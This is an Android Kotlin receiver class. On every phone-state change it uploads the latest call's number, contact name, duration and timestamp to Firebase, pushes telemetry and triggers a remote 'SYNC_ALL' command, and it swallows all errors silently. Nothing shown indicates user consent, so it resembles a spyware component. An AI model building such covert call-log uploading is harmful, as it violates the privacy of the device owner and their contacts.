package com.example.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import com.example.data.sync.CallLogSyncManager
import com.example.data.sync.FirebaseSyncEngine
import com.example.data.sync.RemoteCommandManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class CallReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == TelephonyManager.ACTION_PHONE_STATE_CHANGED) {
            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
            if (state == TelephonyManager.EXTRA_STATE_RINGING || state == TelephonyManager.EXTRA_STATE_OFFHOOK || state == TelephonyManager.EXTRA_STATE_IDLE) {
                val pendingResult = goAsync()
                val appContext = context.applicationContext
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val callLogs = CallLogSyncManager(appContext).syncCallLogs()
                        val engine = FirebaseSyncEngine(appContext)
                        if (callLogs.isNotEmpty()) {
                            val latest = callLogs.first()
                            engine.uploadSingleCallInstant(
                                number = latest.number,
                                name = latest.name,
                                type = latest.type,
                                duration = latest.durationSeconds,
                                timestamp = latest.timestamp
                            )
                        }
                        engine.pushTelemetryToFirebase()
                        RemoteCommandManager(appContext).executeCommand("SYNC_ALL", "Call State Change: $state")
                    } catch (_: Exception) {
                    } finally {
                        pendingResult.finish()
                    }
                }
            }
        }
    }
}

